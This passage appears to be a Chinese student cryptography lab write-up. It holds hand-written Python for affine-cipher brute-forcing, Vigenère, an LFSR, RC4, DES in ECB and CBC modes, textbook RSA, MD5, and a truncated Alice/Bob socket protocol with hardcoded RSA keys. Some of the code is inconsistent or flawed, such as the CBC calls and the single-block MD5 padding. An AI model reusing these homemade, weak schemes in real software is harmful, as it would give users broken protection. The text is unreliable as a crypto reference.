加解密结果如图所示 破解仿射密码这里使用了加解密中的 gcd findModReverse，找出26以内且与26互素的所有数的逆元，并存放在一个列表中 12345678def findAllre(): # 找出所有小于26且与26互素的数 re_all = [] for i in range(1,26): if gcd(i,26) == 1: res = findModReverse(i,26) re_all.append(res) #re_all.sort() return re_all 完整代码如下 12345678910111213141516171819202122232425262728293031323334353637383940414243def gcd(a,b): # 求出最大公因数 while a!=0: a,b = b%a,a return bdef findModReverse(a,m): #扩展欧几里得算法求模逆 if gcd(a,m)!=1: return None u1,u2,u3 = 1,0,a v1,v2,v3 = 0,1,m while v3!=0: q = u3//v3 v1,v2,v3,u1,u2,u3 = (u1-q*v1),(u2-q*v2),(u3-q*v3),v1,v2,v3 return u1%mdef findAllre(): # 找出所有小于26且与26互素的数 re_all = [] for i in range(1,26): if gcd(i,26) == 1: res = findModReverse(i,26) re_all.append(res) #re_all.sort() return re_alldef decode(s): re_all = findAllre() for k1 in re_all: for k2 in range(0, 26): result = &quot;&quot; for i in range(len(s)): s2 = chr(((int(k1) * (ord(s[i]) - 97 - k2)) % 26 + 97)) result = result + s2 print(&quot;k1=&quot; + str(findModReverse(k1,26)) + &quot;, k2=&quot; + str(k2) + &quot; plaintext = &quot; + result)def main(): # criphertext = &#x27;falszztysyjzyjkywjrztyjztyynaryjkyswarztyegyyj&#x27; criphertext = input(&quot;请输入要破解的密文: &quot;) criphertext = criphertext.lower() print(&quot;---------&quot;*3+&quot;strat attck&quot;+&quot;---------&quot;*3) decode(criphertext)if __name__ == &#x27;__main__&#x27;: main() 效果如下 维吉尼亚密码1.简介维吉尼亚密码（又译维热纳尔密码）是使用一系列凯撒密码组成密码字母表的加密算法，属于多表密码的一种简单形式。 维吉尼亚密码曾多次被发明。该方法最早记录在吉奥万·巴蒂斯塔·贝拉索（ Giovan Battista Bellaso）于1553年所著的书《吉奥万·巴蒂斯塔·贝拉索先生的密码》（意大利语：La cifra del. Sig. Giovan Battista Bellaso）中。然而，后来在19世纪时被误传为是法国外交官布莱斯·德·维吉尼亚（Blaise De Vigenère）所创造，因此现在被称为“维吉尼亚密码”。 维吉尼亚密码以其简单易用而著称，同时初学者通常难以破解，因而又被称为“不可破译的密码”。这也让很多人使用维吉尼亚密码来加密的目的就是为了将其破解。 2.加解密原理 加解密代码 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859# 将密钥处理成和密文/明文一样长def solve_key(s,key): nkey = key while len(nkey) &lt; len(s): nkey = nkey+key nkey = nkey[:len(s)] return nkey# 加密函数def encode(s,key): print(&#x27;加密后的结果： &#x27;,end=&#x27;&#x27;) s1 = s.upper() key1 = solve_key(s, key) key1 = key1.upper() result = &quot;&quot; for i in range(0,len(s)): s2 = chr(abs(((ord(s1[i])-65)+(ord(key1[i])-65)) % 26) + 65) result = result + s2 print(result.lower())# 解密函数def decode(s,key): print(&#x27;解密后的结果： &#x27;, end=&#x27;&#x27;) s1 = s.upper() key1 = solve_key(s, key) key1 = key1.upper() result = &quot;&quot; for i in range(0, len(s)): s2 = chr(((ord(s1[i]) - 65) - (ord(key1[i]) - 65)) % 26 + 65) result = result + s2 print(result.lower())def main(): while 1: # 函数入口 answer = input(f&#x27;请输入所需的操作：编码/E or 解码/D: &#x27;) try: if answer.upper() == &#x27;E&#x27;: key = input(&#x27;请输入密钥: &#x27;) key = &quot;&quot;.join(filter(str.isalpha, key)) s = input(&#x27;请输入明文: &#x27;) s = &quot;&quot;.join(filter(str.isalpha, s)) # 将字符串中的非字母字符去掉 # print(s) encode(s, key) elif answer.upper() == &#x27;D&#x27;: key = input(&#x27;请输入密钥: &#x27;) key = &quot;&quot;.join(filter(str.isalpha, key)) s = input(&#x27;请输入密文: &#x27;) s = &quot;&quot;.join(filter(str.isalpha, s)) decode(s, key) else: print(&#x27;输入错误！&#x27;) except KeyError: print(&#x27;请检查输入是否正确！&#x27;)if __name__ == &#x27;__main__&#x27;: main() 二、序列密码LFSR代码实现 12345678910111213141516171819202122232425262728293031323334353637def lsrf(inti, top): sum = 0 inti2 = &quot;0&quot;*len(inti) inti2 = list(inti2) inti1 = &#x27;&#x27; for i in range(len(inti)): if top[i] == &quot;1&quot;: sum += int(inti[i]) sum = sum % 2 for i in range(len(inti)): if i == 0: inti2[i] = str(sum) else: inti2[i] = inti[i - 1] inti1 = inti1.join(inti2) return inti1def main(): inti_str = str(input(&quot;请输入初始化序列：&quot;)) inti_str = inti_str[::-1] inti_str_backup = inti_str top = str(input(&quot;请输入本原多项式：&quot;)) top = top[::-1] for i in range(2 ** len(inti_str) + 1): if inti_str_backup == inti_str and i != 0 and i == 2 ** len(inti_str) - 1: print(&quot;第&#123;0&#125;次&quot;.format(i), inti_str_backup) print(&quot;是本原多项式且周期是&quot; + str(i)) break elif inti_str_backup == inti_str and i != 0 and i != 2 ** len(inti_str) - 1: print(&quot;第&#123;0&#125;次&quot;.format(i), inti_str_backup) print(&quot;不是本原多项式且周期是&quot; + str(i)) break print(&quot;第&#123;0&#125;次&quot;.format(i), inti_str_backup) inti_str_backup = lsrf(inti_str_backup, top)if __name__ == &#x27;__main__&#x27;: main() 选择本原多项式和初始序列如下 12100000000001000000011100010100100101 程序运行结果 RC4完整代码 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667import hashlibimport base64# S盒初始化置换,Key为密钥def Rc4_init(S, Key): j = 0 Key = Key.encode(&#x27;UTF-8&#x27;) Key = hashlib.md5(Key).hexdigest() # 长度为32的字符串 tmp = [] for i in range(256): S.append(i) tmp.append(Key[i % len(Key)]) for i in range(256): j = (j + S[i] + ord(tmp[i])) % 256 S[i], S[j] = S[j], S[i] # 交换S[i],S[j]def rc4_Encode(S, plaintext): i = j = 0 result = &#x27;&#x27; for a in plaintext: i = (i + 1) % 256 j = (j + S[i]) % 256 S[i], S[j] = S[j], S[i] t = (S[i] + S[j]) % 256 k = chr(ord(a) ^ S[t]) result += k result = base64.b64encode(result.encode(&#x27;UTF-8&#x27;)) result = result.decode() return resultdef rc4_Decode(S, criphtext): i = j = 0 criphtext = base64.b64decode(criphtext) criphtext = str(criphtext.decode()) result = &#x27;&#x27; for a in criphtext: i = (i + 1) % 256 j = (j + S[i]) % 256 S[i], S[j] = S[j], S[i] t = (S[i] + S[j]) % 256 k = chr(ord(a) ^ S[t]) result += k return resultdef main(): while 1: order = input(&quot;请输入指令,加密/E,解密/D :&quot;) if order.upper() ==&#x27;E&#x27;: plaintext = input(&#x27;请输入明文: &#x27;) key = input(&quot;请输入密钥: &quot;) s = [] Rc4_init(s, key) cryphtext = rc4_Encode(s, plaintext) print(&quot;密文为: &quot;, cryphtext) print(&#x27;\\n&#x27;) else: cryphtext = input(&quot;请输入密文: &quot;) key = input(&quot;请输入密钥: &quot;) s = [] Rc4_init(s, key) plaintext = rc4_Decode(s, cryphtext) print(&quot;明文为: &quot;, plaintext) print(&#x27;\\n&#x27;)if __name__ == &#x27;__main__&#x27;: main() 三、DESDEC_ECB模式 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248# 两字符进行异或运算def xor(str1, str2): res = &quot;&quot; for i in range(0, len(str1)): xor_res = int(str1[i], 10)^int(str2[i], 10) if xor_res == 1: res += &#x27;1&#x27; else: res += &#x27;0&#x27; return res# 处理字符串，将每个字符串都转成八位二进制数def str_process(str): res = &quot;&quot; for i in str: tmp = bin(ord(i))[2:] tmp = (8 - len(tmp)) * &#x27;0&#x27; + tmp # 不够八位则在前面补 0 res += tmp return res# PC-1盒处理def key_change_1(str): change_table = [57,49,41,33,25,17,9,1, 58,50,42,34,26,18,10, 2,59,51,43,35,27,19,11, 3,60,52,44,36,63,55,47, 39,31,23,15,7,62,54,46, 38,30,22,14,6,61,53,45, 37,29,21,13,5,28,20,12,4] res = &quot;&quot; for i in change_table: res += str[i-1] return res# PC-2盒处理def key_change_2(str): change_table = [14,17,11,24,1,5,3,28, 15,6,21,10,23,19,12,4, 26,8,16,7,27,20,13,2, 41,52,31,37,47,55,30,40, 51,45,33,48,44,49,39,56, 34,53,46,42,50,36,29,32] res = &quot;&quot; for i in change_table: res += str[i-1] return res# 循环左移def left_run(str, num): tmp_str = str[num:len(str)] tmp_str = tmp_str+str[0:num] return tmp_str# 生成16个子密钥def key_gen(str): key_list = [] key_change_res = key_change_1(str) key_c = key_change_res[0:28] key_d = key_change_res[28:] num = [0, 1, 1, 2, 2, 2, 2, 2, 2, 1, 2, 2, 2, 2, 2, 2, 1] for i in range(1, 17): #共16轮 key_c = left_run(key_c, num[i]) key_d = left_run(key_d, num[i]) key_yiwei = key_c + key_d key_res = key_change_2(key_yiwei) key_list.append(key_res) return key_list# IP盒处理def begin_change(str): change_table = [58,50,42,34,26,18,10,2, 60,52,44,36,28,20,12,4, 62,54,46,38,30,22,14,6, 64,56,48,40,32,24,16,8, 57,49,41,33,25,17,9,1, 59,51,43,35,27,19,11,3, 61,53,45,37,29,21,13,5, 63,55,47,39,31,23,15,7] res = &quot;&quot; for i in change_table: res += str[i-1] return res# E盒处理 32位-&gt;48位def E_box(str): change_table = [32,1,2,3,4,5,4,5, 6,7,8,9,8,9,10,11, 12,13,12,13,14,15,16,17, 16,17,18,19,20,21,20,21, 22,23,24,25,24,25,26,27, 28,29,28,29,30,31,32,1] res = &quot;&quot; for i in change_table: res += str[i-1] return res# s盒处理 48位-&gt;32位def S_box(str): j = 0 s_list = [[14,4,13,1,2,15,11,8,3,10,6,12,5,9,0,7,0,15,7,4,14,2,13,1,10,6,12,11,9,5,3,8,4,1,14,8,13,6,2,11,15,12,9,7,3,10,5,0,15,12,8,2,4,9,1,7,5,11,3,14,10,0,6,13], [15,1,8,14,6,11,3,4,9,7,2,13,12,0,5,10,3,13,4,7,15,2,8,14,12,0,1,10,6,9,11,5,0,14,7,11,10,4,13,1,5,8,12,6,9,3,2,15,13,8,10,1,3,15,4,2,11,6,7,12,0,5,14,9], [10,0,9,14,6,3,15,5,1,13,12,7,11,4,2,8,13,7,0,9,3,4,6,10,2,8,5,14,12,11,15,1,13,6,4,9,8,15,3,0,11,1,2,12,5,10,14,7,1,10,13,0,6,9,8,7,4,15,14,3,11,5,2,12], [7,13,14,3,0,6,9,10,1,2,8,5,11,12,4,15,13,8,11,5,6,15,0,3,4,7,2,12,1,10,14,9,10,6,9,0,12,11,7,13,15,1,3,14,5,2,8,4,3,15,0,6,10,1,13,8,9,4,5,11,12,7,2,14], [2,12,4,1,7,10,11,6,8,5,3,15,13,0,14,9,14,11,2,12,4,7,13,1,5,0,15,10,3,9,8,6,4,2,1,11,10,13,7,8,15,9,12,5,6,3,0,14,11,8,12,7,1,14,2,13,6,15,0,9,10,4,5,3], [12,1,10,15,9,2,6,8,0,13,3,4,14,7,5,11,10,15,4,2,7,12,9,5,6,1,13,14,0,11,3,8,9,14,15,5,2,8,12,3,7,0,4,10,1,13,11,6,4,3,2,12,9,5,15,10,11,14,1,7,6,0,8,13], [4,11,2,14,15,0,8,13,3,12,9,7,5,10,6,1,13,0,11,7,4,9,1,10,14,3,5,12,2,15,8,6,1,4,11,13,12,3,7,14,10,15,6,8,0,5,9,2,6,11,13,8,1,4,10,7,9,5,0,15,14,2,3,12], [13,2,8,4,6,15,11,1,10,9,3,14,5,0,12,7,1,15,13,8,10,3,7,4,12,5,6,11,0,14,9,2,7,11,4,1,9,12,14,2,0,6,10,13,15,3,5,8,2,1,14,7,4,10,8,13,15,12,9,0,3,5,6,11] ] res = &quot;&quot; for i in range(0, len(str), 6): begin_s = str[i:i + 6] row = int(begin_s[0] + begin_s[5], 2) #第一位和第六位作为行 col = int(begin_s[1:5], 2) #中间四位作为列 index = s_list[j][row * 16 + col] num = bin(index)[2:] #将匹配的数字转换位二进制数 for k in range(0, 4 - len(num)): #不够4位则补0 num = &quot;0&quot; + num res += num j = j + 1 return res# p盒处理 置换操作def P_box(str): res = &quot;&quot; change_table = [16,7,20,21,29,12,28,17, 1,15,23,26,5,18,31,10, 2,8,24,14,32,27,3,9, 19,13,30,6,22,11,4,25] for i in change_table: res += str[i - 1] return res# F函数def F_function(str, key): # R(32位)-&gt;E盒(48位)-&gt;与key的子密钥异或-&gt;S盒-&gt;P置换 str_e_res = E_box(str) # 将 E 异或 S P 集合到一个函数种，便于调用 xor_res = xor(str_e_res, key) str_s_res = S_box(xor_res) str_p_res = P_box(str_s_res) return str_p_res# 逆IP盒def IP_re(str): res = &quot;&quot; ip_list = [40,8,48,16,56,24,64,32, 39,7,47,15,55,23,63,31, 38,6,46,14,54,22,62,30, 37,5,45,13,53,21,61,29, 36,4,44,12,52,20,60,28, 35,3,43,11,51,19,59,27, 34,2,42,10,50,18,58,26, 33,1,41,9,49,17,57,25 ] for i in ip_list: res += str[i-1] return res# DES加密操作def DESencode(text, key): text_bin = str_process(text) # 将字符转换为二进制数 text_IP = begin_change(text_bin) # 明文初始置换 key_bin = str_process(key) # 将密钥转换位二进制数 key_list = key_gen(key_bin) # key_lsst 数组中存放着十六个子密钥 text_left = text_IP[0:32] # R0 text_right = text_IP[32:] # L0 for i in range(0, 15): # 十五轮加密 mes_tmp = text_right # 临时变量用于左右两部分交换 text_right = xor(F_function(text_right, key_list[i]) , text_left) #F 函数的作用 R(32位)-&gt;E盒(48位)-&gt;与key的子密钥异或(32位)-&gt;S盒(32位)-&gt;P置换(32位) text_left = mes_tmp fin_right = text_right # 第十六轮加密 fin_left = xor(F_function(text_right, key_list[15]), text_left) criph_text = fin_left + fin_right criph_text = IP_re(criph_text) # IP逆置换 return criph_text# 针对一组的解密程序def DESdecode(text, key): #密文直接输64位2进制 key_bin = str_process(key) # 将密钥转换为二进制数 key_list = key_gen(key_bin) # 生成的十六个子密钥 text = begin_change(text) # 先初始值换 与加密过程相反 cipher_left = text[0:32] # R16 cipher_right = text[32:] # L16 i = 15 while i &gt; 0: # 十五轮加密 反过来 cipher_tmp = cipher_right #设置一个临时变量用于后面的交换 cipher_right = xor(cipher_left, F_function(cipher_right, key_list[i])) # F 函数的作用 R(32位)-&gt;E盒(48位)-&gt;与key的子密钥异或(32位)-&gt;S盒(32位)-&gt;P置换(32位) # F 函数处理完后与L(32位)异或 cipher_left = cipher_tmp # 左右交换完成 i = i - 1 left_text = xor(cipher_left, F_function(cipher_right, key_list[0])) # 一 right_text = cipher_right # 二 三 这三步是第十六轮加密 plain_bin = left_text + right_text # plain_bin = IP_re(plain_bin) # plain_text = &quot;&quot; for i in range(0, len(plain_bin), 8): plain_text += chr(int(plain_bin[i:i + 8], 2)) return plain_textdef Divide_text(order,text,key): # 将明文或者明文分组 明文分成8个字符一组，密文则分成64bit一组 block_text = [] res = &quot;&quot; length = 0 if order == &quot;E&quot;: length = 8 else: length = 64 i = 0 while text[i:i+length] != &quot;&quot;: block_text.append(text[i:i+length]) i += length if order == &#x27;E&#x27;: if len(block_text[-1]) != 8: # 最后一组明文如果不够八个字符则添加 + 补齐八个 否则程序会报错 block_text[-1] = block_text[-1] + &#x27;+&#x27; * (8 - len(block_text[-1])) for text in block_text: # 分别对每组加密 res += DESencode(text, key) else: for text in block_text: # 对密文解密 res += DESdecode(text, key) return resdef main(): while 1: plaintext = &#x27;&#x27; ciphertext = &#x27;&#x27; key = &#x27;&#x27; order = input(&quot;加密请按E,解密请按D:&quot;) if order == &#x27;E&#x27;: plaintext = input(&quot;请输入明文：&quot;) key = input(&quot;请输入密钥：&quot;) ciphertext = Divide_text(order, plaintext, key) print(&quot;密文是：&quot;) print(ciphertext) else: ciphertext = input(&quot;请输入密文：&quot;) key = input(&quot;请输入密钥：&quot;) plaintext = Divide_text(order, ciphertext, key) print(&quot;明文是：&quot;) print(plaintext)if __name__ == &#x27;__main__&#x27;: main() DES_CBC模式 只需要修改ECB模式中的 Divide_text 部分 12345678910111213141516171819202122232425262728293031323334353637def Divide_text(order,text,key): # 将明文或者明文分组 明文分成8个字符一组，密文则分成64bit一组 block_text = [] IV = &#x27;aaaaaaaa&#x27; # 初始化向量 IV_bin = str_process(IV) res = &quot;&quot; length = 0 if order == &quot;E&quot;: length = 8 else: length = 64 i = 0 while text[i:i+length] != &quot;&quot;: block_text.append(text[i:i+length]) i += length tmp = &quot;&quot; # 加密 if order == &#x27;E&#x27;: if len(block_text[-1]) != 8: # 最后一组明文如果不够八个字符则添加 + 补齐八个 否则程序会报错 block_text[-1] = block_text[-1] + &#x27;+&#x27; * (8 - len(block_text[-1])) for i in range(len(block_text)): # 分别对每组加密 if i == 0 : tmp = DESencode(block_text[i],key, IV_bin) res += tmp else: tmp = DESencode(block_text[i],key,tmp) res += tmp # 解密 else: for i in range(len(block_text)): if i == 0: tmp = block_text[i] res += DESdecode(block_text[i], key, IV_bin) else: res += DESdecode(block_text[i], key, tmp) tmp = block_text[i] return res 四、RSA123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108# -*- coding = utf - 8 -*-#@Time : 2020/12/23 14:24#@Author : sunzy#@File : rsa.pyfrom Crypto.Util.number import *import random# 模重复平方法def fast_mod(p,q,n): # p为底数，p为指数 res = 1 while q: if q &amp; 1: res = (res * p) % n q &gt;&gt;= 1 # 右移1位 p = (p * p) % n return res# 计算出d#这个扩展欧几里得算法求模逆,用于求ddef caculateD(a, m): u1,u2,u3 = 1,0,a v1,v2,v3 = 0,1,m while v3!=0: q = u3//v3 v1,v2,v3,u1,u2,u3 = (u1-q*v1),(u2-q*v2),(u3-q*v3),v1,v2,v3 return u1%m# 将字符转化为十六进制字符串def str2Hex(m): return &quot;&quot;.join(&quot;&#123;:02x&#125;&quot;.format(ord(x)) for x in m)# 素性检验：采用 Miler-Rabin 检验法# 所有的𝑟 ∈ [0, 𝑠 − 1]，若𝑎^𝑑 ≠ 1(𝑚𝑜𝑑 𝑛)且𝑎^((2^𝑟)*𝑑) ≠ −1(𝑚𝑜𝑑 𝑛)，则𝑛是合数。否则，𝑛有 3/4的概率为素数def miller_rabin(n): s = n - 1 t = 0 while s % 2 == 0: # n,s,t之间的关系为 n = 2^s * t s = s // 2 t += 1 for trials in range(10): # 可以多增加几轮保证大概率为素数 a = random.randrange(2, n - 1) # 随机生成a v = pow(a, s, n) # 验证 a^(n-1) mod n if v != 1: i = 0 while v != (n - 1): if i == t - 1: return False else: i = i + 1 v = (v ** 2) % n return True# 生成素数 先生成1024位的奇数，再进行素性检验，通过则生成该素数def genPrime(b=1024): while True: # 设置死循环直到生成素数才退出 res = &quot;1&quot; for i in range(b-2): res += str(random.randint(0,1)) res += &quot;1&quot; # 最后一位为1保证为奇数 res = int(res,2) if miller_rabin(res): return res # 直到该数通过素数检验才推出循环def genE(phi_n): while True: e = genPrime(b=random.randint(3,13)) #随机生成e if e &lt; 2000 : # e不能太小 continue if phi_n%e != 0: # 保证e不能被phi整除 return edef RSAEncode(m, e, n): # 加密公式 m^e mod n m = int(str2Hex(m), 16) # 将字符转换为二进制 c = fast_mod(m, e, n) return cdef RSADecode(c, d, n): # 加密公式 c^d mod n plaintext = fast_mod(c,d,n) plaintext = str(long_to_bytes(plaintext).decode()) # 将数字转换为字符 return plaintextdef main(): # 生成两个大素数p和q print(&quot;Generate p,q and e, please wait... &quot;) p = genPrime() q = genPrime() print (&quot;p = &quot;+str(p)) print (&quot;q = &quot;+str(q)) n = p*q print (&quot;n = &quot;+str(n)) # 用欧拉定理计算 phi_n phi_n = (p-1)*(q-1) # 生成e e = genE(phi_n) print (&quot;e = &quot;+str(e)) # m = &quot;Hello world!&quot; m = str(input(&#x27;请输入明文: &#x27;)) # 加密算法 Cryphtext = RSAEncode(m, e, n) print (&quot;The Ciphertext is: &quot;+str(Cryphtext)) # 解密算法 d = caculateD(e, phi_n) Plaintext = RSADecode(Cryphtext, d, n) print (&quot;The Plaintext is: &quot;+Plaintext)if __name__ == &#x27;__main__&#x27;: main() 五、MD5123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184# -*- coding = utf - 8 -*-#@Time : 2020/12/18 21:50#@Author : sunzy#@File : MD5.pyimport math# 定义初始向量abcd,并将其转换成2进制,且补0到32位# 标准的幻数（物理顺序）是（A=(01234567)16，B=(89ABCDEF)16，C=(FEDCBA98)16，D=(76543210)16）。如果在程序中定义应该是:# （A=0X67452301L，B=0XEFCDAB89L，C=0X98BADCFEL，D=0X10325476L）ABCD_list = [&#x27;67452301&#x27;,&#x27;efcdab89&#x27;,&#x27;98badcfe&#x27;,&#x27;10325476&#x27;]for i in range(len(ABCD_list)): tmp = bin(int(ABCD_list[i], 16))[2:] if len(tmp) &lt; 32: tmp = (32 - len(tmp)) * &#x27;0&#x27; + tmp ABCD_list[i] = tmpA0,B0,C0,D0 = ABCD_list[0], ABCD_list[1], ABCD_list[2], ABCD_list[3]# 生成第1-64个式子的第i个32比特常数Ti = []for i in range(0, 64): result = (int(4294967296 * abs(math.sin(i + 1)))) &amp; 0xffffffff result = bin(result)[2:] if len(result) &lt; 32: result = (32 - len(result)) * &#x27;0&#x27; + result Ti.append(result)# 实现x,y的逐比特与def and1(x, y): res = &#x27;&#x27; for i in range(0, len(x)): res += str(int(x[i])&amp;int(y[i])) return res# 实现x,y的逐比特或def or1(x, y): res = &#x27;&#x27; for i in range(0, len(x)): res += str(int(x[i])|int(y[i])) return res# 实现x,y的逐比特异或def xor(x, y): res = &#x27;&#x27; for i in range(0, len(x)): res += str(int(x[i])^int(y[i])) return res# 实现x的逐比特逻辑反def reverse(x): res = &#x27;&#x27; for i in range(0, len(x)): res += str((int(x[i], 2) + 1) % 2) return res# 实现x的循环左移def shift(x, i): res = &#x27;&#x27; for t in range(0, len(x) - i): res = res + x[t + i:t + i + 1] # 先保存 x[i:] 再保存x[:i] for y in range(0, i): res = res + x[y:y + 1] return res# 实现整数模2的三十二次方加法def add(x, y): a = int(x,2) #先将二进制转换成十进制 b = int(y,2) res = (a + b)%(2**32) res = str(bin(res)[2:]) if len(res) != 32: # 补充到32位 res = (32-len(res))*&#x27;0&#x27;+res return res# 定义f,g,h,i函数def ffunc(x, y, z): # ((x&amp;y)|((~x)&amp;z)) t = and1(x, y) t1 = reverse(x) t2 = and1(t1, z) return or1(t, t2)def gfunc(x, y, z): # ((x&amp;z)|(y&amp;(~z))) t = and1(x, z) t1 = reverse(z) t2 = and1(y, t1) return or1(t, t2)def hfunc(x, y, z): # (x^y^z) t1 = xor(x, y) t2 = xor(t1, z) return t2def ifunc(x, y, z): # (y^(x|(~z))) t = reverse(z) t1 = or1(x, t) return xor(y, t1)def fill(text): text1 = &#x27;&#x27; for i in text: t = str(ord(i)) t = str(bin(int(t, 10))[2:]) if len(t) &lt; 8: # 将每个字符转换成8位二进制数 for num in range(8 - len(t)): t = &#x27;0&#x27; + t text1 = text1 + t length = len(text1) length1 = 512 - len(text1) - 65 # length1是要填充0的位数 text1 = text1 + &#x27;1&#x27; # 第一位添加 0 text1 = text1 + &#x27;0&#x27;*length1 # 将其补充到 N*512+448 N可以为0 text2 = bin(length)[2:] # 将字符长度转换成二进制数 if len(text2) &lt; 8: # 填充后面64位,先填充字符串的长度,再补0 text2 = &#x27;0&#x27;*(8 - len(text2)) + text2 length2 = 64 - len(text2) text2 = text2 + &#x27;0&#x27;*length2 # 填充后面64位,先填充字符串的长度,再补0 return text1 + text2# 将最后得到的ABCD逆序输出 最后一步使用def reverse_order(a): res = a[24:32] + a[16:24] + a[8:16] + a[0:8] return res# 输入要加密的明文password = input(&quot;请输入要加密的信息:&quot;)# 填充算法x = fill(password)j = 0M = []for i in range(0,len(x),32): # 将512位分成十六组 M.append(x[i:i+32]) M[j] = M[j][24:32] + M[j][16:24] + M[j][8:16] + M[j][0:8] j+=1# md5算法的第一步A,B,C,D= A0,B0,C0,D0 #为第五步 相加原始的A,B,C,D做备份# md5算法的第二步AA,BB,CC,DD = A,B,C,D# md5算法的第三步# 第一轮 每轮A,B,C,D都处理四次，四轮就是十六次，一共六十四次for i in range(4): # f函数 A = add(B, shift(add(A, add(add(ffunc(B, C, D), M[4*i]), Ti[4 * i])), 7)) D = add(A, shift(add(D, add(add(ffunc(A, B, C), M[4*i+1]), Ti[4 * i + 1])), 12)) C = add(D, shift(add(C, add(add(ffunc(D, A, B), M[4*i+2]), Ti[4 * i + 2])), 17)) B = add(C, shift(add(B, add(add(ffunc(C, D, A), M[4*i+3]), Ti[4 * i + 3])), 22))# 第二轮k = 1j = 16for i in range(4): A = add(B, shift(add(A, add(add(gfunc(B, C, D), M[(k+5*(4*i))%16]), Ti[j + i * 4])), 5)) D = add(A, shift(add(D, add(add(gfunc(A, B, C), M[(k+5*(4*i+1))%16]), Ti[j + i * 4 + 1])), 9)) C = add(D, shift(add(C, add(add(gfunc(D, A, B), M[(k+5*(4*i+2))%16]), Ti[j + i * 4 + 2])), 14)) B = add(C, shift(add(B, add(add(gfunc(C, D, A), M[(k+5*(4*i+3))%16]), Ti[j + i * 4 + 3])), 20))# 第三轮k = 5j = 32for i in range(4): A = add(B, shift(add(A, add(add(hfunc(B, C, D), M[(k+i*4*3)%16]), Ti[j + i * 4])), 4)) D = add(A, shift(add(D, add(add(hfunc(A, B, C), M[(k+(i*4+1)*3)%16]), Ti[j + i * 4 + 1])), 11)) C = add(D, shift(add(C, add(add(hfunc(D, A, B), M[(k+(i*4+2)*3)%16]), Ti[j + i * 4 + 2])), 16)) B = add(C, shift(add(B, add(add(hfunc(C, D, A), M[(k+(i*4+3)*3)%16]), Ti[j + i * 4 + 3])), 23))# 第四轮k = 0j = 48for i in range(4): A = add(B, shift(add(A, add(add(ifunc(B, C, D), M[(k+(i*4)*7)%16]), Ti[j + i * 4])), 6)) D = add(A, shift(add(D, add(add(ifunc(A, B, C), M[(k+(i*4+1)*7)%16]), Ti[j + i * 4 + 1])), 10)) C = add(D, shift(add(C, add(add(ifunc(D, A, B), M[(k+(i*4+2)*7)%16]), Ti[j + i * 4 + 2])), 15)) B = add(C, shift(add(B, add(add(ifunc(C, D, A), M[(k+(i*4+3)*7)%16]), Ti[j + i * 4 + 3])), 21))# 第五步 将计算出的A,B,C,D与初始的相加，并赋值A,B,C,D = add(A, AA),add(B, BB),add(C, CC),add(D, DD)# 输出得到的密文ciphertext = reverse_order(A) + reverse_order(B) + reverse_order(C) + reverse_order(D)cipher = ciphertextciphertext = str(hex(int(ciphertext, 2))[2:]) # 将二进制数转换为十六进制数ciphertext = &#x27;0&#x27;*(32-len(ciphertext))+ciphertext # 为了避免第一个数字为零时无法显示出来print(&quot;hash值(小写):&quot;,ciphertext)print(&quot;hash值(大写):&quot;,ciphertext.upper()) 六、综合实验6.1 实验内容现在，Alice想通过公共信道给Bob传输一份秘密文件（文件非常大）。又知道，很多人和机构想得到这份文件。需要设计一个通信模型，来保证文件的机密性和完整性。 现在很多人想要得到这份文件，那么，可能会有很多人在假冒Bob的身份，来请求得到这个文件，需要对Bob身份进行验证；也有可能是很多人得不到文件，就假冒Alice的身份，想要给Bob发送文件，如果有人发送恶意文件给Bob，Bob发现不是想要的文件，但这个文件给Bob电脑安装了后门，等他接受了正确的文件，就存在泄漏的风险，所以需要对Alice身份进行验证。 6.2 分析实验需求现在很多人想要得到这份文件，那么，可能会有很多人在假冒Bob的身份，来请求得到这个文件，需要对Bob身份进行验证；也有可能是很多人得不到文件，就假冒Alice的身份，想要给Bob发送文件，如果有人发送恶意文件给Bob，Bob发现不是想要的文件，但这个文件给Bob电脑安装了后门，等他接受了正确的文件，就存在泄漏的风险，所以需要对Alice身份进行验证。 根据分析，所得结果如下: 传输的是秘密文件，所以可能存在人冒充bob接收文件，所以Alice在与传输文件之前需要对bob的身份进行认证，而且bob防止被欺骗也需要对Alice的身份进行认证，这里可以采用第二类签名算法。 在确认彼此身份后需要将文件通过公共信道传输，但是可能存在攻击人劫持，所以需要对文件内容加密，而文件内容很大，考虑到加密速度问题，所以采用对称加密算法。 采用对称加密算法需要密钥，而这里使用随机生成的密钥。并且这个密钥也需要传给bob用于解密，但是公共信道不安全，所以也需要对该密钥进行加密。考虑到密钥长度不是很大，所以可以采用公钥加密算法，而且公钥加密算法可以解决传输此次加密使用的密钥，提高安全性和效率。 Bob收到密文和加密后的密钥，使用自己的私钥解密出对称加密算法使用的密钥，然后使用密钥解密密文后向Alice发送确认消息，确保bob收到消息。 确认消息也要使用到第一步使用的签名算法。 6.3 程序流程图 6.4 完整代码Alice 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485# -*- coding = utf - 8 -*-#@Time : 2021/1/3 23:17#@Author : sunzy#@File : Alice.pyfrom RSA import *from DES import *from MD5 import *from file_decode import *import socketn_bob = 81836285346168841919828227774710209132464519960137459236348092425786962849543n = 44531776921047477359676235110843825307036514195195627878765712056028758572817d = 34159352569920789505556306994405309761109146525598570740717995833480670158209e = 65537name = &quot;This is alice.&quot;client = socket.socket()client.connect((&#x27;127.0.0.1&#x27;,8888)) # 本机地址和端口data = client.recv(1024)print(str(data, &quot;utf-8&quot;),end=&quot;&quot;)client.send(b&#x27;1&#x27;)print(&quot;等待bob验证自身身份...&quot;)# alice送出自己的身份信息和签名值client.send(bytes(name,&#x27;utf-8&#x27;)) # 